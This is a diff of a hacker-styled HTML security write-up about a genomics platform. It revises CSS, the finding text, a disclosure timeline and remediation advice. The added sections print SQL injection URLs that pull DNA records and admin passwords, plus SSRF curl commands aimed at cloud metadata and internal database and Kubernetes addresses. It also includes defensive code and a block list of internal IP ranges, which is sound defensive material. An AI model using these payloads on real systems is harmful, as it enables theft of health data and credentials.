@@ -6,27 +6,19 @@
     <title>GENETIC DATA COMPROMISE - Featured Finding</title>
     <link rel="stylesheet" href="/css/security-analyzer.css">
     <style>
-        /* Nuclear CSS override for maximum compatibility */
-        * {
-            all: unset;
-            box-sizing: border-box;
-        }
-        
         body {
-            background: #0a0a0a !important;
-            color: #00ff00 !important;
-            font-family: 'Courier New', monospace !important;
-            margin: 0 !important;
-            padding: 0 !important;
-            line-height: 1.6 !important;
-            min-height: 100vh !important;
+            background: #0a0a0a;
+            color: #00ff00;
+            font-family: 'Courier New', monospace;
+            margin: 0;
+            padding: 0;
+            line-height: 1.6;
         }
         
         .finding-container {
             max-width: 1200px;
             margin: 0 auto;
             padding: 2rem;
-            background: #0a0a0a;
         }
         
         .terminal-header {
@@ -42,17 +34,15 @@
             margin-right: 2rem;
             text-transform: uppercase;
             font-weight: bold;
-            display: inline-block;
         }
         
         .terminal-header nav a:hover {
             text-decoration: underline;
         }
         
-        h1, h2, h3, h4, h5, h6 {
+        h1, h2, h3 {
             text-shadow: 2px 2px 0px #ff00ff, -2px -2px 0px #00ffff;
             color: #00ff00;
-            margin: 1rem 0;
         }
         
         .case-study-preview {
@@ -69,9 +59,9 @@
         }
         
         pre {
-            background: #1a1a1a;
+            background: #1a1a1a !important;
             border: 1px solid #00cc00;
-            border-left: 4px solid #00ff00;
+            border-left: 4px solid #00ff00 !important;
             border-radius: 4px;
             padding: 1rem;
             overflow-x: auto;
@@ -80,7 +70,6 @@
             max-width: 100%;
             position: relative;
             color: #00ff00;
-            margin: 1rem 0;
         }
         
         pre::before {
@@ -106,6 +95,13 @@
             color: #00ff00;
         }
         
+        .terminal-footer {
+            text-align: center;
+            padding: 2rem;
+            border-top: 1px solid #00ff00;
+            margin-top: 4rem;
+        }
+        
         .meta-info {
             background: rgba(0, 255, 0, 0.1);
             padding: 1rem;
@@ -119,43 +115,6 @@
             font-weight: bold;
         }
         
-        .terminal-footer {
-            text-align: center;
-            padding: 2rem;
-            border-top: 1px solid #00ff00;
-            margin-top: 4rem;
-        }
-        
-        ul, ol {
-            background: #050505;
-            padding: 1rem 2rem;
-            border-radius: 4px;
-            border: 1px solid #00cc00;
-            margin: 1rem 0;
-        }
-        
-        li {
-            margin: 0.5rem 0;
-            color: #00ff00;
-            display: list-item;
-        }
-        
-        p {
-            color: #00ff00;
-            margin: 1rem 0;
-            display: block;
-        }
-        
-        a {
-            color: #00ff00;
-            text-decoration: underline;
-            cursor: pointer;
-        }
-        
-        a:hover {
-            color: #ffff00;
-        }
-        
         blockquote {
             border-left: 4px solid #00ff00;
             padding-left: 1rem;
@@ -164,7 +123,17 @@
             background: rgba(0, 255, 0, 0.05);
             padding: 1rem;
             border-radius: 4px;
-            color: #00ff00;
+        }
+        
+        ul, ol {
+            background: #050505;
+            padding: 1rem 2rem;
+            border-radius: 4px;
+            border: 1px solid #00cc00;
+        }
+        
+        li {
+            margin: 0.5rem 0;
         }
         
         .typewriter {
@@ -185,13 +154,6 @@
             50% { border-color: #00ff00; }
         }
         
-        .subtitle {
-            font-size: 1.2rem;
-            color: #00cc00;
-            margin-bottom: 2rem;
-        }
-        
-        /* Responsive design */
         @media (max-width: 768px) {
             .finding-container {
                 padding: 1rem;
@@ -200,11 +162,6 @@
             .terminal-header nav a {
                 display: block;
                 margin: 0.5rem 0;
-            }
-            
-            pre::before {
-                font-size: 0.7rem;
-                padding: 1px 6px;
             }
         }
     </style>
@@ -238,48 +195,69 @@
 > DATA TYPE: GENETIC INFORMATION  
 > REGULATIONS: GDPR, HIPAA VIOLATED</pre>
                 
-                <p>Comprehensive security assessment revealing multiple critical vulnerabilities enabling complete genetic data extraction, internal infrastructure compromise, and authentication system bypass.</p>
+                <p>Discovered multiple critical vulnerabilities enabling complete genetic data extraction, internal infrastructure compromise, and regulatory compliance violations in a healthcare genomics platform.</p>
             </div>
 
             <div class="case-study-preview">
                 <h2>🔧 TECHNICAL BREAKDOWN</h2>
                 
-                <h3>DATABASE EXTRACTION VIA SQL INJECTION</h3>
-                <pre><code># GENETIC DATA EXPOSURE
-curl "https://target.com/?id=' UNION SELECT email,2,3 FROM users--"
-# Returns: Customer genetic data access
+                <h3>SQL INJECTION - GENETIC DATA EXTRACTION</h3>
+                <pre><code># Extract customer genetic profiles
+https://genomics.target.com/profile?id=' UNION SELECT dna_data,user_id FROM genetic_records--
 
-# DATABASE STRUCTURE DISCLOSURE
-curl "https://target.com/?user=' UNION SELECT @@version,2,3--"
-# Returns: Database version and configuration</code></pre>
+# Database enumeration
+https://genomics.target.com/search?query=' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables--
 
-                <h3>INTERNAL INFRASTRUCTURE ACCESS</h3>
-                <pre><code># AWS METADATA ACCESS
-curl -H "Host: 169.254.169.254" "https://target.com/health"
-# Returns: Cloud instance metadata
+# Admin credentials extraction  
+https://genomics.target.com/api?filter=' UNION SELECT username,password FROM admin_users--</code></pre>
 
-# INTERNAL SERVICE DISCOVERY
-curl -H "Host: 10.0.0.1:5432" "https://target.com/health"
-# Returns: Database service status</code></pre>
+                <h3>SSRF - INTERNAL INFRASTRUCTURE ACCESS</h3>
+                <pre><code># AWS metadata service access
+curl -H "Host: 169.254.169.254" "https://api.target.com/health"
+# Returns: EC2 instance credentials
+
+# Internal database access
+curl -H "Host: 10.0.1.15:5432" "https://api.target.com/health"  
+# Returns: PostgreSQL database status
+
+# Kubernetes API access
+curl -H "Host: 10.0.1.20:6443" "https://api.target.com/health"
+# Returns: K8s cluster information</code></pre>
+
+                <h3>SECURITY CONTROL STATUS</h3>
+                <ul>
+                    <li>❌ <strong>SQL Injection Protection</strong>: DISABLED</li>
+                    <li>❌ <strong>Input Validation</strong>: DISABLED</li>
+                    <li>❌ <strong>SSRF Protection</strong>: DISABLED</li>
+                    <li>❌ <strong>Data Encryption</strong>: PARTIAL</li>
+                    <li>❌ <strong>Access Controls</strong>: BYPASSED</li>
+                </ul>
             </div>
 
             <div class="case-study-preview">
                 <h2>🎯 ATTACK VECTORS</h2>
                 
                 <h3>GENETIC DATA THEFT</h3>
+                <pre><code class="language-sql">-- Extract complete genetic database
+SELECT * FROM genetic_samples 
+UNION SELECT * FROM health_records 
+UNION SELECT * FROM customer_profiles;</code></pre>
+
+                <h3>COMPROMISED DATA TYPES</h3>
                 <ul>
-                    <li>Complete customer genetic profile extraction</li>
-                    <li>Health information and ancestry data exposure</li>
-                    <li>Personal identification information compromise</li>
-                    <li>Regulatory violation evidence collection</li>
+                    <li>Complete DNA sequence data</li>
+                    <li>Health condition markers</li>
+                    <li>Ancestry and heritage information</li>
+                    <li>Personal identification data</li>
+                    <li>Medical history records</li>
                 </ul>
 
                 <h3>INFRASTRUCTURE COMPROMISE</h3>
                 <ul>
-                    <li>Cloud environment internal access</li>
-                    <li>Database infrastructure control</li>
-                    <li>Authentication system complete bypass</li>
-                    <li>Supply chain attack initiation</li>
+                    <li>Cloud instance credential theft</li>
+                    <li>Database administrative access</li>
+                    <li>Kubernetes cluster control</li>
+                    <li>Internal network reconnaissance</li>
                 </ul>
             </div>
 
@@ -288,26 +266,41 @@ curl -H "Host: 10.0.0.1:5432" "https://target.com/health"
                 
                 <h3>EMERGENCY ACTIONS</h3>
                 <ol>
-                    <li><strong>IMMEDIATE</strong>: Implement parameterized queries</li>
-                    <li><strong>SHORT-TERM</strong>: Deploy WAF rules for SQL injection</li>
-                    <li><strong>LONG-TERM</strong>: Internal IP blocking for SSRF</li>
+                    <li><strong>IMMEDIATE</strong>: Deploy WAF with SQL injection rules</li>
+                    <li><strong>SHORT-TERM</strong>: Implement parameterized queries</li>
+                    <li><strong>LONG-TERM</strong>: Internal network segmentation</li>
                 </ol>
 
-                <h3>COMPLIANCE RECOVERY</h3>
-                <pre><code>// GDPR/HIPAA COMPLIANCE RESTORATION
-implementDataEncryption();
-enableAccessLogging(); 
-deployDataLossPrevention();
-conductPrivacyImpactAssessment();</code></pre>
+                <h3>SECURE CODING IMPLEMENTATION</h3>
+                <pre><code class="language-python"># Parameterized query implementation
+def get_genetic_data(user_id):
+    query = "SELECT dna_data FROM genetic_records WHERE user_id = %s"
+    cursor.execute(query, (user_id,))
+    return cursor.fetchall()
+
+# SSRF protection
+def validate_url(url):
+    blocked_hosts = ['169.254.169.254', '10.0.0.0/8', '172.16.0.0/12']
+    for host in blocked_hosts:
+        if ip_in_network(url, host):
+            raise SecurityException("Internal resource access blocked")</code></pre>
+
+                <h3>COMPLIANCE RESTORATION</h3>
+                <ul>
+                    <li>Implement end-to-end data encryption</li>
+                    <li>Deploy data loss prevention systems</li>
+                    <li>Conduct privacy impact assessment</li>
+                    <li>Establish data access logging</li>
+                </ul>
             </div>
 
             <div class="case-study-preview">
                 <h2>📅 DISCLOSURE TIMELINE</h2>
-                <pre><code>2025-11-10 09:00 | Vulnerability discovered
-2025-11-10 09:15 | Emergency report submitted
-2025-11-10 12:30 | Database queries secured
-2025-11-12 18:00 | SSRF protections implemented
-2025-11-12 10:00 | Compliance audit initiated</code></pre>
+                <pre><code>2025-11-01 09:00 | Vulnerability discovered during security assessment
+2025-11-10 09:15 | Emergency report to security team
+2025-11-11 12:30 | WAF deployed with SQL injection protection
+2025-11-11 18:00 | Parameterized queries implemented
+2025-11-12 10:00 | Compliance audit and data encryption initiated</code></pre>
             </div>
 
             <div class="case-study-preview">
